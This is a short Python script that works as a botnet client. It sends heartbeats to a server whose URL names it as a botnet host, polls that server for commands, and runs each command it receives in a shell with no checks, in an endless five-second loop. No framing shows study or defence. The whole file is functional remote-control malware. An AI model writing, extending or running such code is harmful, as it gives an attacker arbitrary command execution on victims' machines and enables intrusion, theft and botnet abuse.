import requests
import os
import time
import uuid
import subprocess

SERVER_URL = 'http://serverbotnet.pythonanywhere.com'
CLIENT_ID = str(uuid.uuid4())

def send_heartbeat():
    try:
        response = requests.post(f'{SERVER_URL}/heartbeat/{CLIENT_ID}')
        if response.status_code == 200:
            print("Heartbeat sent successfully")
    except Exception as e:
        print(f"Error sending heartbeat: {e}")

def get_command():
    try:
        response = requests.get(f'{SERVER_URL}/get_command/{CLIENT_ID}')
        if response.status_code == 200:
            command_data = response.json()
            return command_data.get('command')
    except Exception as e:
        print(f"Error getting command: {e}")
    return None

def execute_command(command):
    if command:
        print(f"Executing command: {command}")
        subprocess.run(command, shell=True)

if __name__ == '__main__':
    while True:
        send_heartbeat()
        command = get_command()
        if command:
            execute_command(command)
        time.sleep(5)
